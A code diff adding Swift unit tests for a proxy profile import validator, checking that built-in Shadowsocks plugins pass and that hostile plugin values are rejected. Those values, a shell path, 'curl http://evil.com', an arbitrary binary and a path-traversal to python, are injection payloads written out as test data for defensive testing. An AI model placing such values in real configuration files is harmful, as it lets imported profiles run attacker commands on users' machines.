@@ -90,4 +90,83 @@ final class ProfileImportValidatorTests: XCTestCase {
         }
         XCTAssertEqual(checks, 4)
     }
+
+    func testAcceptsSafeBuiltinPluginsAndPluginOpts() {
+        let validProfiles = [
+            """
+            proxies:
+              - name: ss-obfs
+                type: ss
+                server: 127.0.0.1
+                port: 8388
+                cipher: aes-128-gcm
+                password: secret
+                plugin: obfs
+                plugin-opts:
+                  mode: http
+                  host: bing.com
+            """,
+            """
+            proxies:
+              - { name: ss-inline, type: ss, server: 1.1.1.1, port: 8388, cipher: aes-128-gcm, password: pwd, plugin: obfs, plugin-opts: { mode: http, host: bing.com } }
+            """,
+            """
+            proxies:
+              - name: ss-v2ray
+                type: ss
+                server: 127.0.0.1
+                port: 8388
+                cipher: aes-128-gcm
+                password: secret
+                plugin: "v2ray-plugin"
+                plugin-opts:
+                  mode: websocket
+                  host: example.com
+            """,
+            """
+            proxies:
+              - name: ss-shadowtls
+                type: ss
+                server: 127.0.0.1
+                port: 8388
+                cipher: aes-128-gcm
+                password: secret
+                plugin: 'shadow-tls'
+                plugin-opts:
+                  host: example.com
+                  password: tls-password
+                  version: 3
+            """
+        ]
+
+        for profile in validProfiles {
+            XCTAssertNoThrow(
+                try ProfileImportValidator.validate(data: Data(profile.utf8)),
+                "Safe built-in plugin should be accepted: \(profile)"
+            )
+        }
+    }
+
+    func testRejectsMaliciousOrExternalPlugins() {
+        let maliciousProfiles = [
+            "proxies: [{name: evil, type: ss, plugin: /bin/sh}]",
+            "proxies: [{name: evil, type: ss, plugin: 'curl http://evil.com'}]",
+            "proxies: [{name: evil, type: ss, plugin: custom-binary}]",
+            """
+            proxies:
+              - name: evil-block
+                type: ss
+                plugin: "../../../usr/bin/python"
+            """
+        ]
+
+        for profile in maliciousProfiles {
+            XCTAssertThrowsError(
+                try ProfileImportValidator.validate(data: Data(profile.utf8)),
+                "Malicious or arbitrary executable plugin must be rejected: \(profile)"
+            ) { error in
+                XCTAssertEqual(error as? ProfileImportError, .forbiddenExecutableKey("plugin"))
+            }
+        }
+    }
 }
